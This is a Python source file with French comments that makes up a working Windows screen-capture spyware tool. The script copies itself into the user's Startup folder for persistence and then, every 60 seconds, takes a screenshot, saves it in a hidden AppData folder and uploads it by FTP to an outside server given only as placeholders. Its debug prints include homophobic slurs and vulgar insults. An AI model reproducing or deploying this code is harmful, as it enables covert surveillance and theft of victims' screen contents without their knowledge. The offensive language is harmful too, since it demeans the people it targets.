from os import startfile, getenv, path, makedirs
import datetime
from pyautogui import screenshot
import time
import ftplib
from pathlib import Path
from winshell import startup
import sys
from getpass import getuser
from shutil import move


#détecter le path du dossier appdata sur la machine
appdata = getenv('APPDATA')
#détecter le path du dossier startup sur la machine (ne fonctionnait simplement pas avec la lib os je peux aussi simplement récupérer le nom de l'utilisateur et l'ajouter dans le path mais bref)
startup = startup()

script_location = path.split(path.realpath(sys.argv[0]))[0]
print(script_location)

USER_NAME = getuser()

filenamepy = path.basename(__file__)
filenameprocess = filenamepy.rfind(".")
filename = filenamepy[:filenameprocess]
print(filename)
filenameexe = f"{filename}.exe"

print(rf"{script_location}\%s" % filename)

#créer un dossier jul dans le appdata de la machine
dirName = f'{appdata}/jul'
try:
    makedirs(dirName)
except FileExistsError:
    print("pd")

if Path(f'{startup}\screenshoot.exe').is_file():
    print("fdp")
else:
    print('momosexuel')

def jul():
    while True:
        #récupérer la date + l'heure actuelle
        screenmtn = datetime.datetime.now()
        #placer la date et l'heure sous une forme de vrai date sa mère
        date = screenmtn.strftime("%m-%d-%Y %H-%M-%S")
        
        #prendre un screenshoot sur la machine
        screen = screenshot()
        #save le screenshoot dans le dossier
        screen.save(rf'{appdata}\jul\%s.png' % date)
        
        #path de l'image
        jul = Path(rf'{appdata}\jul\%s.png' % date)
        
        #Connexion ftp blablabla upload du fichier
        ftpserveur = 'nameftp'
        ftpusername = 'usernameftp'
        ftppassword = 'passwordftp'
        session = ftplib.FTP(ftpserveur, ftpusername, ftppassword)
        
        file = open(jul,'rb')
        session.storbinary(f'STOR {jul.name}', file)
        file.close()
        session.quit()
        #attendre 60 secondes avant de répeter la tache ducoup
        time.sleep(60)

def add_to_startup(file_path=rf"{script_location}\%s" % filenameexe):
    startuppath = f'{startup}'
    if Path(rf'{startup}\%s.exe' % filename).is_file():
        jul()
        return
    else:
        move(file_path, startuppath)
        time.sleep(30)
        startfile(rf"{startuppath}\%s.exe" % filename)

add_to_startup()